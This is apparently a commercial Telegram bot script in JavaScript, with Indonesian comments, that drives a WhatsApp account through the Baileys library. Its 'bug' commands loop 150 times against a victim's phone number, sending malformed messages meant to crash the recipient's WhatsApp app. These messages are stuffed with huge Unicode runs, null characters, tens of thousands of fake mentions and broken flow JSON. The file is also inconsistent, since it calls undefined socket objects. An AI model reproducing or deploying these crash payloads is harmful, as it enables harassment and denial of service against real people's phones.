const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Ndok = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://d.top4top.io/p_353867k6u1.jpg",
    "https://d.top4top.io/p_353867k6u1.jpg",
    "https://d.top4top.io/p_353867k6u1.jpg",
    "https://d.top4top.io/p_353867k6u1.jpg",
    "https://d.top4top.io/p_353867k6u1.jpg",
    "https://d.top4top.io/p_353867k6u1.jpg"
 
]; 


const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Ndok = makeWASocket(connectionOptions);

    Ndok.ev.on('creds.update', saveCreds);
    store.bind(Ndok.ev);

    Ndok.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭──────────────────────⟤
│  ${chalk.green.bold('WHATSAPP TERHUBUNG')}
╰──────────────────────⟤`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('WHATSAPP TERPUTUS')}
╰──────────────────────⟤`),
                shouldReconnect ? chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('HUBUNGKAN ULANG')}
╰──────────────────────⟤`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.. Buy Premium Di @GyzenVtx");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan /connect terlebih dahulu.");
    return;
  }
  next();
};

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel

    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\` 
( 🪽 ) - R E A L L I T Y
疎外され、同じ扱いを受けることにうんざりしている あなたの心は完全に傷ついている
┏━━━━━⌠ REALLITY ☇ YTI⅃⅃AƎЯ ⌡
┃▢ 𝙳𝙴𝚅𝙾𝙻𝙾𝙿𝙴𝚁 : @AMETHYST
┃▢ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 1.0.0
┃▢ 𝚂𝚃𝙰𝚃𝚄𝚂 : SIMPLE VERSION
┃▢ 𝙻𝙴𝙰𝙶𝚄𝙴 : JS
┗━━━━━━━━━━━━━━━━━━━━━❍
┏━━━━━⌠ 𝙼𝙴𝙽𝚄 𝙾𝚆𝙽 ⌡
┃▢ /𝙲𝙾𝙽𝙽𝙴𝙲𝚃 628xx
┃▢ /𝙰𝙳𝙳𝙿𝚁𝙴𝙼 ɪᴅ 
┃▢ /𝙳𝙴𝙻𝙿𝚁𝙴𝙼 ɪᴅ 
┃▢ /𝙲𝙴𝙺𝙿𝚁𝙴𝙼 ɪᴅ
┗━━━━━━━━━━━━━━━━━━━━━❍
┏━━━━━⌠ 𝙼𝙴𝙽𝚄 BUG ⌡
❁ /xin number
❁ /force number
❁ /null number
❁ /iosx number
┗━━━━━━━━━━━━━━━━━━━━━❍
\`\`\` `,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.url('「 Contact Developer 」', 'https://t.me/AMETHYST1232')]
        ])
    });
});


bot.command("iosx", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: iosx 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 150; i++) {
    await NanBlankIphone(target);
    await NanBlankIphone(target);
    }
    
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE KILLBLANK:✅`,{ parse_mode: "Markdown" });
});

bot.command("xin", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: xin 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 150; i++) {
    await hikikomori(target);
    await isagivisble2(target);
    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE CRASHALLWA:✅`,{ parse_mode: "Markdown" });
});

bot.command("force", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: force 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 150; i++) {
    await FlowxCrl(target);
    await hikikomori(target);
    await FlowxNull(target);
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE INVISIBLE NEW:✅`,{ parse_mode: "Markdown" });
});

bot.command("null", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: null 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 
  
    for (let i = 0; i < 150; i++) {
   await FlowxCrl(target);
   await FlowxNull(target);
   await XtrixFlow(target);
   await hikikomori(target);
   await isagivisble2(target);
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE CRASIPHONE✅`,{ parse_mode: "Markdown" });
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Ndok && Ndok.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Ndok.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});
  
// ========================= [ CRASH FUNCT ] =========================
 async function NanBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "🐉 𝐕𝐨𝐫𝐭𝐮𝐧𝐢𝐱 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🐉" + "ી".repeat(100000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(100000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await Ndok.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}       


async function hikikomori(target) {
  for (let r = 0; r < 1; r++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
           messageContextInfo: {
            deviceListMetadata: {}, 
            deviceListMetaeataVersion: 2,
            messageSecret: crypto.randomBytes(25), 
            supportPayload: {
            version: 2,
            is_ai_message: true, 
            should_show_system_message: true, 
            ticket_id: crypto.randomBytes(2008)
            }
           }, 
            interactiveMessage: {
              header: {
                text: '<𝐂𝐫𝐚𝐬𝐡\\>',
                locationMessage: {
                  degreesLatitude: 999999999,
                  degreesLongitude: -999999999,
                  name: '{'.repeat(100000),
                  address: '{'.repeat(100000)
                }
              },
              body: { text: "REALLITY Is Here ☀" },
              footer: { text: "REALLITY Is Here ☀" },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(40000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "<REALLITY\\>",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "vjSnpPeWQ7ly+37/XaC1e4XwwiPHUaIvPWyf3/Pqlbw=",
                fileLength: "3070510",
                seconds: 16,
                mediaKey: "GE3pFBmSXUH2lWGJKvJYY2U5BIgZyVKQF6JJyzaZNWI=",
                height: 864,
                width: 480,
                fileEncSha256: "n6q6pu9BeJ0dDkSRpKa8y2OtVbZ2bw6pLfKzoyFB/Yc=",
                directPath: "/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1749720441",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }
            }
          }
        }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await gyzen.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      console.log(`force 𝘾𝙡𝙤𝙨𝙚${target}`);
    } catch (err) {
      console.error("❌ 𝙂𝙖𝙜𝙖𝙡 𝙈𝙚𝙣𝙜𝙚𝙧𝙞𝙢 𝘽𝙪𝙜:", err);
    }
  }
}

async function FlowxNull(target) {
  try {
    const XtrixSystem = "꧀".repeat(50000);

    await xtrix.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 99999e99999,
          degreesLongitude: -99999e99999,
          name: "#REALLITY IS HERE🩸⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌" + XtrixSystem,
          url: `https://whatsapp.${XtrixSystem}.crash.null/`,
          contextInfo: {
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 }, 
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            externalAdReply: {
              advertiserName: XtrixSystem,
              caption: XtrixSystem,
              jpegThumbnail: Buffer.from(""),
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -999999999999999999999e9999999999
              }
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000)
            },
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"ꦾ".repeat(2000)}","sections":[{"title":"Crash","rows":[]}]}`
              },
              {
                name: "address_message",
                buttonParamsJson: JSON.stringify({
                  "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(2000),
                  "screen_0_Dropdown_1": "\u0000".repeat(2000),
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            ]
          }
        }
      },
      { participant: { jid: target } }
    );

  } catch (err) {
    console.error(err);
  }
}

async function FlowxCrl(target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "#REALLITYx⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
                  "ꦾ".repeat(10000) +
                  "\u0000".repeat(10000) +
                  "ꦽ".repeat(10000) +
                  "@1".repeat(10000),
              },
              footer: { text: "" },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: `{"title":"${"ꦾ".repeat(3000)}","sections":[{"title":"Crash","rows":[]}]}`
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: JSON.stringify({
                      "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(3000),
                      "screen_0_Dropdown_1": "\u0000".repeat(2000),
                      flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                    }),
                    version: 3,
                  },
                ],
              },
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  target,
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Xtirx",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
                participant: { jid: target },
              },
            },
          },
        },
      },
      {}
    );

    await xtrix.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.log(err);
  }
}

async function XtrixFlow(target) {
  try {
    const XtrixSystem = "꧀".repeat(50000);

    await xtrix.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 99999e99999,
          degreesLongitude: -99999e99999,
          name: "#CeceAkuAnge" + XtrixSystem,
          url: `https://whatsapp.${XtrixSystem}.crash.null/`,
          contextInfo: {
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 }, 
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            externalAdReply: {
              advertiserName: XtrixSystem,
              caption: XtrixSystem,
              jpegThumbnail: Buffer.from(""),
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -999999999999999999999e9999999999
              }
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000)
            },
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"ꦾ".repeat(2000)}","sections":[{"title":"Crash","rows":[]}]}`
              },
              {
                name: "address_message",
                buttonParamsJson: JSON.stringify({
                  "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(2000),
                  "screen_0_Dropdown_1": "\u0000".repeat(2000),
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            ]
          }
        }
      },
      { participant: { jid: target } }
    );

  } catch (err) {
    console.error(err);
  }
}

async function isagivisble2(target) {
        	try {
        		let messageObject = await generateWAMessageFromContent(target, {
        			viewOnceMessage: {
        				message: {
        					extendedTextMessage: {
        						text: `🩸𝐕𝐨𝐫𝐭𝐮𝐧𝐢𝐱 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲🩸`,
        						contextInfo: {
        							mentionedJid: Array.from({
        								length: 30000
        							}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
        							isSampled: true,
        							participant: target,
        							remoteJid: "status@broadcast",
        							forwardingScore: 9741,
        							isForwarded: true
        						}
        					}
        				}
        			}
        		}, {});
        		await Ndok.relayMessage("status@broadcast", messageObject.message, {
        			messageId: messageObject.key.id,
        			statusJidList: [target],
        			additionalNodes: [{
        				tag: "meta",
        				attrs: {},
        				content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target },
        						content: undefined,
        					}],
        				}],
        			}],
        		});
        	} catch (err) {
        		console.log(err)
        		await Ndok.sendMessage("! Error Type", err)
        	}
        	console.log(chalk.green("Succesfully Send Bug Invisible"));
        }
// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red("\nIVortunix Infinity"));
    console.log(chalk.bold.white("DEVELOPER: @GyzenVtx"));
    console.log(chalk.bold.white("VERSION: 3.0.0"));
    console.log(chalk.bold.white("ACCESS:") + chalk.bold.green(" FREE VERSION"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR PENGGUNA SCRIP🎉"));
})();